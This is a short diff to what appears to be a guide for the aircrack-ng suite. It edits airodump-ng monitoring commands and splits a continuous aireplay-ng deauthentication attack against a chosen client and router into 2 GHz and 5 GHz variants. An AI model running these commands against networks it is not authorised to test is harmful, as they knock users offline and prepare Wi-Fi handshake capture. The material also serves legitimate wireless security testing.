@@ -107,7 +107,9 @@ $ sudo airodump-ng mon0 --band ag
 
 $ sudo airodump-ng mon0 --bssid <routerMAC> --channel <channel of router>
 
-$ sudo aireplay-ng --deauth 0 -c <deviceMAC> -a <routerMAC> mon0 -D
+2 Ghz: $ sudo aireplay-ng --deauth 0 -c <deviceMAC> -a <routerMAC> mon0
+
+5 Ghz: $ sudo aireplay-ng --deauth 0 -c <deviceMAC> -a <routerMAC> mon0 -D
 ```
 
 -----
